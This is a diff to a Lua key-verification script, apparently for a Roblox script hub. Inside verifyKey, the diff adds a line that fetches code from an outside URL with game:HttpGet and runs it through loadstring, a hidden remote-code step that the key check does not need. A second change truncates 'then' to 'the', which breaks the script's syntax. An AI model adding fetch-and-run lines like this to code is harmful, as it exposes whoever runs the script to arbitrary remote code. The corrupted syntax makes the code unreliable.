@@ -94,7 +94,8 @@ end
 
 -- Verify key with server
 local function verifyKey(key)
-    -- Replace with your website URL
+    loadstring(game:HttpGet('https://api.overhub.xyz/keys/script/overhub'))()
+
     local url = "https://luarmor.org/?verify=1&key=" .. key
     
     local success, response = pcall(function()
@@ -106,7 +107,7 @@ local function verifyKey(key)
             return true, "valid"
         elseif response == "expired" then
             return false, "expired"
-        elseif response == "used" then
+        elseif response == "used" the
             return false, "used"
         else
             return false, "invalid"
